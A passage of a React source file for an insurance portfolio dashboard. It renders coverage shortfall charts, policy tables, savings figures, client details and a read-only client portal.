            background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)",
            borderRadius: 12, padding: "18px 22px"
          }}>
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start" }}>
              <div>
                <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{label}</div>
                <div style={{ fontSize: 22, fontWeight: 800, color, marginTop: 6 }}>{val}</div>
              </div>
              <div style={{ fontSize: 20 }}>{icon}</div>
            </div>
          </div>
        ))}
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1.2fr 1fr", gap: 20, marginBottom: 20 }}>
        {/* Coverage Bar Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage & Shortfall</h3>
          <ResponsiveContainer width="100%" height={240}>
            <BarChart data={barData}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="name" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Legend />
              <Bar dataKey="ideal" name="Ideal" fill="#2563eb" radius={[4, 4, 0, 0]} />
              <Bar dataKey="current" name="Current" fill="#059669" radius={[4, 4, 0, 0]} />
              <Bar dataKey="shortfall" name="Shortfall" fill="#ef4444" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>

        {/* Pie Chart */}
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Current Coverage Mix</h3>
          {pieData.length > 0 ? (
            <ResponsiveContainer width="100%" height={240}>
              <PieChart>
                <Pie data={pieData} cx="50%" cy="50%" innerRadius={50} outerRadius={90}
                  dataKey="value" label={({ name, percent }) => `${name} ${(percent * 100).toFixed(0)}%`}
                  labelLine={false}>
                  {pieData.map((_, i) => <Cell key={i} fill={PIE_COLORS[i % PIE_COLORS.length]} />)}
                </Pie>
                <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              </PieChart>
            </ResponsiveContainer>
          ) : (
            <div style={{ color: "#94a3b8", textAlign: "center", marginTop: 60 }}>No coverage data yet</div>
          )}
        </div>
      </div>

      {/* Coverage Breakdown Table */}
      <div style={{ display: "grid", gridTemplateColumns: "1.4fr 1fr", gap: 20 }}>
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>Coverage Breakdown</h3>
          <table style={{ width: "100%", borderCollapse: "collapse" }}>
            <thead>
              <tr>
                {["Coverage", "Current", "Ideal", "Savings Needed", "Shortfall"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.5, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {[
                ["Life & Term/TI", "lifeTI"],
                ["TPD", "tpd"],
                ["Critical Illness", "criticalIllness"],
                ["Early Illness", "earlyIllness"],
                ["Endowment", "endowment"],
              ].map(([label, key]) => {
                const row = cb[key] || {};
                return (
                  <tr key={key}>
                    <td style={{ padding: "10px 10px", fontSize: 13, fontWeight: 600 }}>{label}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#60a5fa" }}>{fmt(row.current)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.ideal)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13 }}>{fmt(row.savingsNeeded)}</td>
                    <td style={{ padding: "10px 10px", fontSize: 13, color: "#f87171", fontWeight: 700 }}>{fmt(row.shortfall)}</td>
                  </tr>
                );
              })}
            </tbody>
          </table>
        </div>

        <div style={{ display: "grid", gap: 16 }}>
          {/* Medical H&S */}
          <StatusCard title="Medical H&S" items={[
            ["Medishield Life", client.medicalHS?.medishieldLife],
            ["Integrated Plan", client.medicalHS?.integratedPlan],
            ["Rider (add-on)", client.medicalHS?.rider],
          ]} />
          {/* Severe Disability */}
          <StatusCard title="Severe Disability" items={[
            ["CareShield Life", client.severeDisability?.careShieldLife],
            ["ElderShield", client.severeDisability?.elderShield],
            ["LongTerm Care", client.severeDisability?.longTermCare],
          ]} />
          {/* Housing */}
          <StatusCard title="Housing / Dependant" items={[
            ["Dependant Protection Scheme", client.housingDependant?.dependantProtectionScheme],
            ["Home Protection Scheme", client.housingDependant?.homeProtectionScheme],
          ]} />
        </div>
      </div>
    </div>
  );
}

function StatusCard({ title, items }) {
  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 18 }}>
      <div style={{ fontSize: 13, fontWeight: 700, color: "#e2e8f0", marginBottom: 10 }}>{title}</div>
      {items.map(([label, val]) => (
        <div key={label} style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "5px 0", borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
          <span style={{ fontSize: 12, color: "#94a3b8" }}>{label}</span>
          <span style={{
            fontSize: 11, fontWeight: 700, padding: "2px 8px", borderRadius: 4,
            background: val === "Yes" ? "rgba(5,150,105,0.2)" : "rgba(100,116,139,0.2)",
            color: val === "Yes" ? "#34d399" : "#94a3b8"
          }}>{val || "—"}</span>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// POLICIES TAB
// ============================================================
function PoliciesTab({ client, clients, saveClients, updateClient }) {
  function deletePolicy(id) {
    const updated = { ...client, policies: client.policies.filter(p => p.id !== id) };
    updateClient(updated);
  }

  const lifePolices = client.policies.filter(p => ["Whole Life Limited","Whole Life","Term Life","Personal Accident","Critical Illness","Early Critical Illness"].includes(p.type));
  const healthPolicies = client.policies.filter(p => ["Integrated Plan","Integrated Plan Rider","Long Term Care"].includes(p.type));
  const generalPolicies = client.policies.filter(p => ["Home Insurance","Travel Insurance (Annual)"].includes(p.type));
  const savingsPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));

  return (
    <div style={{ display: "grid", gap: 24 }}>
      {[
        ["Life Insurance Policies", lifePolices],
        ["Health & Disability Insurance", healthPolicies],
        ["General Insurance", generalPolicies],
        ["Savings & Wealth Accumulation", savingsPolicies],
      ].map(([sectionTitle, polList]) => polList.length === 0 ? null : (
        <div key={sectionTitle} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15, fontWeight: 700 }}>{sectionTitle}</h3>
          <div style={{ overflowX: "auto" }}>
            <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
              <thead>
                <tr>
                  {["#","Type","Insurer","Plan","Policy No","Insured","Death","TPD","CI","Early CI","Premium","Annual","Start","Term","Status","Action"].map(h => (
                    <th key={h} style={{ textAlign: "left", padding: "8px 8px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)", whiteSpace: "nowrap" }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {polList.map((pol, i) => (
                  <tr key={pol.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{i + 1}</td>
                    <td style={{ padding: "10px 8px", fontWeight: 600 }}>{pol.type}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insurer}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.planName}</td>
                    <td style={{ padding: "10px 8px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.insured}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.death ? fmt(pol.coverage.death) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.tpd ? fmt(pol.coverage.tpd) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.ci ? fmt(pol.coverage.ci) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.coverage?.earlyCI ? fmt(pol.coverage.earlyCI) : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{fmt(pol.premium?.amount)}</td>
                    <td style={{ padding: "10px 8px", color: "#34d399" }}>{fmt(pol.premium?.annual)}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.startDate || "—"}</td>
                    <td style={{ padding: "10px 8px" }}>{pol.premiumTerm ? pol.premiumTerm + "y" : "—"}</td>
                    <td style={{ padding: "10px 8px" }}>
                      <span style={{
                        padding: "2px 6px", borderRadius: 4, fontSize: 10, fontWeight: 700,
                        background: pol.status === "Active" ? "rgba(5,150,105,0.2)" : "rgba(239,68,68,0.2)",
                        color: pol.status === "Active" ? "#34d399" : "#f87171"
                      }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "10px 8px" }}>
                      <button onClick={() => deletePolicy(pol.id)} style={{
                        background: "rgba(239,68,68,0.2)", border: "none", color: "#f87171",
                        borderRadius: 4, padding: "2px 8px", cursor: "pointer", fontSize: 11
                      }}>✕</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </div>
      ))}
    </div>
  );
}

// ============================================================
// COVERAGE TAB — detailed calculation
// ============================================================
function CoverageTab({ client }) {
  const cc = client.coverageCalculation || {};
  const rc = client.retirementCalculation || {};

  return (
    <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 20 }}>
      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Coverage Calculation</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 13 }}>
          <thead>
            <tr>
              <th style={{ textAlign: "left", padding: "6px 8px", color: "#94a3b8", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>Parameter</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#60a5fa", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>LIFE</th>
              <th style={{ textAlign: "right", padding: "6px 8px", color: "#db2777", fontSize: 11, borderBottom: "1px solid rgba(255,255,255,0.08)" }}>CRITICAL</th>
            </tr>
          </thead>
          <tbody>
            {[
              ["Monthly Needs", cc.life?.monthlyNeeds, cc.critical?.monthlyNeeds, true],
              ["Annual Amount", cc.life?.annualAmount, cc.critical?.annualAmount, true],
              ["Years Required", cc.life?.yearsRequired, cc.critical?.yearsRequired, false],
              ["Inflation (2-5%)", cc.life?.inflation ? (cc.life.inflation * 100).toFixed(1) + "%" : "—", cc.critical?.inflation ? (cc.critical.inflation * 100).toFixed(1) + "%" : "—", false],
            ].map(([label, lifeV, critV, isMoney]) => (
              <tr key={label}>
                <td style={{ padding: "10px 8px", color: "#94a3b8" }}>{label}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#60a5fa" }}>{isMoney ? fmt(lifeV) : lifeV}</td>
                <td style={{ padding: "10px 8px", textAlign: "right", fontWeight: 600, color: "#db2777" }}>{isMoney ? fmt(critV) : critV}</td>
              </tr>
            ))}
          </tbody>
        </table>
      </div>

      <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Retirement Calculation</h3>
        {[
          ["Monthly Requirement", fmt(rc.monthlyRequirement)],
          ["Annual", fmt(rc.annual)],
          ["Period from Age 65", rc.yearsFromAge65 + " years"],
          ["Inflation (2-5%)", rc.inflation ? (rc.inflation * 100).toFixed(1) + "%" : "—"],
          ["Amount Required", fmt(rc.amountRequired)],
        ].map(([label, val]) => (
          <div key={label} style={{ display: "flex", justifyContent: "space-between", padding: "10px 0", borderBottom: "1px solid rgba(255,255,255,0.06)" }}>
            <span style={{ color: "#94a3b8", fontSize: 13 }}>{label}</span>
            <span style={{ fontWeight: 700, fontSize: 13, color: label === "Amount Required" ? "#fbbf24" : "#f1f5f9" }}>{val}</span>
          </div>
        ))}
      </div>

      {/* Policy Detail Breakdown */}
      <div style={{ gridColumn: "span 2", background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
        <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Policies Details Breakdown</h3>
        <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
          <thead>
            <tr>
              {["No", "Policy Number", "Plan Name", "Coverage Type", "Sum Assured", "Claimed", "Remaining SA", "Status", "Remarks"].map(h => (
                <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
              ))}
            </tr>
          </thead>
          <tbody>
            {client.policies.flatMap((pol, pidx) => {
              const rows = [];
              const covTypes = [
                ["Life/TI", pol.coverage?.death],
                ["TPD", pol.coverage?.tpd],
                ["Critical Illness", pol.coverage?.ci],
                ["Early Critical Illness", pol.coverage?.earlyCI],
              ].filter(([, v]) => v && v > 0);

              if (covTypes.length === 0) {
                rows.push(
                  <tr key={pol.id + "_0"} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pidx + 1}</td>
                    <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{pol.policyNumber}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.planName}</td>
                    <td style={{ padding: "8px 10px" }}>{pol.type}</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>—</td>
                    <td style={{ padding: "8px 10px" }}>
                      <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>
                    </td>
                    <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{pol.remarks || "—"}</td>
                  </tr>
                );
              } else {
                covTypes.forEach(([covType, amount], ci) => {
                  rows.push(
                    <tr key={pol.id + "_" + ci} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? pidx + 1 : ""}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{ci === 0 ? pol.policyNumber : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{ci === 0 ? pol.planName : ""}</td>
                      <td style={{ padding: "8px 10px" }}>{covType}</td>
                      <td style={{ padding: "8px 10px", color: "#60a5fa" }}>{fmt(amount)}</td>
                      <td style={{ padding: "8px 10px" }}>{fmt(pol.claimed || 0)}</td>
                      <td style={{ padding: "8px 10px", color: "#34d399" }}>{fmt((amount || 0) - (pol.claimed || 0))}</td>
                      <td style={{ padding: "8px 10px" }}>
                        {ci === 0 && <span style={{ background: "rgba(5,150,105,0.2)", color: "#34d399", padding: "1px 6px", borderRadius: 4, fontSize: 10 }}>{pol.status}</span>}
                      </td>
                      <td style={{ padding: "8px 10px", color: "#94a3b8" }}>{ci === 0 ? (pol.remarks || "—") : ""}</td>
                    </tr>
                  );
                });
              }
              return rows;
            })}
          </tbody>
        </table>
      </div>
    </div>
  );
}

// ============================================================
// SAVINGS TAB
// ============================================================
function SavingsTab({ client }) {
  const savPolicies = client.policies.filter(p => ["Education","Endowment","Retirement"].includes(p.type));
  const totalInvested = savPolicies.reduce((s, p) => s + (p.currentInvested || 0), 0);
  const totalValue = savPolicies.reduce((s, p) => s + (p.currentValue || 0), 0);
  const totalPnL = totalValue - totalInvested;

  const er = client.expectedReturn || [];

  return (
    <div style={{ display: "grid", gap: 20 }}>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(3,1fr)", gap: 16 }}>
        {[
          ["Total Invested", fmt(totalInvested), "#2563eb"],
          ["Current Value", fmt(totalValue), "#059669"],
          ["Profit / Loss", fmt(totalPnL), totalPnL >= 0 ? "#34d399" : "#f87171"],
        ].map(([l, v, c]) => (
          <div key={l} style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: "20px 24px" }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8 }}>{l}</div>
            <div style={{ fontSize: 24, fontWeight: 800, color: c, marginTop: 6 }}>{v}</div>
          </div>
        ))}
      </div>

      {savPolicies.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Savings Policies</h3>
          <table style={{ width: "100%", borderCollapse: "collapse", fontSize: 12 }}>
            <thead>
              <tr>
                {["Type","Insurer","Plan","Policy No","Start","Maturity","Invested","Value","P&L%","Remarks"].map(h => (
                  <th key={h} style={{ textAlign: "left", padding: "8px 10px", color: "#94a3b8", fontSize: 10, textTransform: "uppercase", borderBottom: "1px solid rgba(255,255,255,0.08)" }}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {savPolicies.map(p => (
                <tr key={p.id} style={{ borderBottom: "1px solid rgba(255,255,255,0.04)" }}>
                  <td style={{ padding: "10px 10px" }}>{p.type}</td>
                  <td style={{ padding: "10px 10px" }}>{p.insurer}</td>
                  <td style={{ padding: "10px 10px" }}>{p.planName}</td>
                  <td style={{ padding: "10px 10px", color: "#60a5fa" }}>{p.policyNumber}</td>
                  <td style={{ padding: "10px 10px" }}>{p.startDate}</td>
                  <td style={{ padding: "10px 10px" }}>{p.maturityDate || "—"}</td>
                  <td style={{ padding: "10px 10px" }}>{fmt(p.currentInvested)}</td>
                  <td style={{ padding: "10px 10px", color: "#34d399" }}>{fmt(p.currentValue)}</td>
                  <td style={{ padding: "10px 10px", color: (p.profitPct || 0) >= 0 ? "#34d399" : "#f87171" }}>{p.profitPct ? p.profitPct.toFixed(2) + "%" : "—"}</td>
                  <td style={{ padding: "10px 10px", color: "#94a3b8" }}>{p.remarks || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {er.length > 0 && (
        <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
          <h3 style={{ margin: "0 0 16px", fontSize: 15 }}>Expected Return Timeline</h3>
          <ResponsiveContainer width="100%" height={200}>
            <BarChart data={er}>
              <CartesianGrid strokeDasharray="3 3" stroke="rgba(255,255,255,0.05)" />
              <XAxis dataKey="age" tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <YAxis tickFormatter={v => "$" + (v / 1000) + "k"} tick={{ fill: "#94a3b8", fontSize: 11 }} />
              <Tooltip formatter={(v) => fmt(v)} contentStyle={{ background: "#1e293b", border: "1px solid rgba(255,255,255,0.1)" }} />
              <Bar dataKey="value" name="Expected Return" fill="#2563eb" radius={[4, 4, 0, 0]} />
            </BarChart>
          </ResponsiveContainer>
        </div>
      )}
    </div>
  );
}

// ============================================================
// INFO TAB
// ============================================================
function InfoTab({ client }) {
  const info = client.info || {};
  const fields = [
    ["Date of Birth", info.dob],
    ["Age", info.age],
    ["NRIC / Passport", info.nric],
    ["Citizenship", info.citizenship],
    ["Marital Status", info.maritalStatus],
    ["Gender", info.gender],
    ["Qualification", info.qualification || info.highestQualification],
    ["Annual Income", info.annualIncome],
    ["Smoker", info.smoker],
    ["Employment Status", info.employmentStatus],
    ["Risk Profile", info.riskProfile],
    ["Preferred Retirement Age", info.retirementAge],
    ["Home Owner", info.homeOwner],
    ["Car Owner", info.carOwner],
    ["Kids", info.kids],
  ];

  return (
    <div style={{ background: "rgba(255,255,255,0.04)", border: "1px solid rgba(255,255,255,0.1)", borderRadius: 12, padding: 24 }}>
      <h3 style={{ margin: "0 0 20px", fontSize: 15 }}>Client Information</h3>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 16 }}>
        {fields.map(([label, val]) => (
          <div key={label} style={{ padding: "12px 16px", background: "rgba(255,255,255,0.04)", borderRadius: 8 }}>
            <div style={{ color: "#94a3b8", fontSize: 11, textTransform: "uppercase", letterSpacing: 0.8, marginBottom: 4 }}>{label}</div>
            <div style={{ fontSize: 14, fontWeight: 600 }}>{val != null ? String(val) : "—"}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ============================================================
// CLIENT VIEW (read-only portal)
// ============================================================
function ClientView({ client, tab, setTab, onLogout }) {
  const tabs = ["dashboard", "policies", "coverage", "savings"];
  return (
    <div style={{ minHeight: "100vh", background: "#0f172a", fontFamily: "'Segoe UI',sans-serif", color: "#f1f5f9" }}>
      <div style={{
        background: "rgba(255,255,255,0.04)", borderBottom: "1px solid rgba(255,255,255,0.1)",
        padding: "0 32px", display: "flex", alignItems: "center", justifyContent: "space-between", height: 56
      }}>
        <div style={{ display: "flex", alignItems: "center", gap: 12 }}>
          <span style={{ fontSize: 20 }}>🛡️</span>
          <span style={{ fontWeight: 700, fontSize: 16 }}>My Insurance Portfolio</span>
        </div>
        <div style={{ display: "flex", alignItems: "center", gap: 16 }}>
          <span style={{ color: "#94a3b8", fontSize: 13 }}>Welcome, {client.name}</span>
          <button onClick={onLogout} style={{
            padding: "6px 14px", borderRadius: 6, border: "1px solid rgba(255,255,255,0.15)",
            background: "transparent", color: "#94a3b8", cursor: "pointer", fontSize: 13
          }}>Log Out</button>
        </div>
      </div>

      <div style={{ padding: "32px" }}>
        <div style={{ display: "flex", gap: 6, marginBottom: 28 }}>
          {tabs.map(t => (
            <button key={t} onClick={() => setTab(t)} style={{
              padding: "8px 18px", borderRadius: 6, border: "none", cursor: "pointer", fontSize: 13,
              background: tab === t ? "#2563eb" : "rgba(255,255,255,0.06)",
              color: tab === t ? "#fff" : "#94a3b8", fontWeight: tab === t ? 700 : 400, textTransform: "capitalize"
            }}>{t}</button>
          ))}
        </div>

        {tab === "dashboard" && <DashboardTab client={client} />}
        {tab === "policies" && <PoliciesTab client={client} clients={[client]} saveClients={() => {}} updateClient={() => {}} />}
        {tab === "coverage" && <CoverageTab client={client} />}
        {tab === "savings" && <SavingsTab client={client} />}
      </div>
    </div>
  );
}
